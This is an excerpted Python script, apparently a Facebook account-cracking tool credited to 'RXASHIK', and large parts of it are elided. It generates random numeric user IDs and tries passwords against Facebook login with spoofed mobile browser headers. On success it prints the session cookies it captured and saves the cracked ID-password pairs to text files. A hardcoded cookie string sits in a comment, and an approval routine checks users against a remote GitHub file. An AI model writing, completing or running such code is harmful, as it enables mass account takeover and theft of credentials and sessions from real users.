...
--------------------------------------------------
[•]CREATED BY     : \033[1;32mRXASHIK\033[1;37m
[•]FACEBOOK       : \033[1;32mRXASHIK\033[1;37m
[•]YOUTUBE        : \033[1;32mMSS ASHIK\033[1;37m
...
def malik_baloch():
	...
	os.system('clear')
	print(logo)
	print('[•] [1000] [2000] MAX LIMIT [50000]')
	lines()
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
...
def chos():
    ...
    os.system("clear")
    print(logo)
    print('[•] EXAMPLE :  [11223344]1,2,3,4,5,6,7,8,9,Etc')
    lines()
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=S7Q8Zfcj2ukx53x1v_9wH3PB; sb=S7Q8Ze8Z79rWCYXuyOl5K6Ez; m_pixel_ratio=2; wd=360x669; fr=0GFLToxJKJuIWMl9p..BlPLRL.22.AAA.0.0.BlPLYf.AWUWrvcnZwk',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2006C3LG"',
	...
	'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ABASHIK-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('ABASHIK-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[ASHIK-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('RX ASHIK-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mABASHIK\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Lovely900keya/ALAMI/blob/main/Ala.txt').text
    if id in httpCaht:
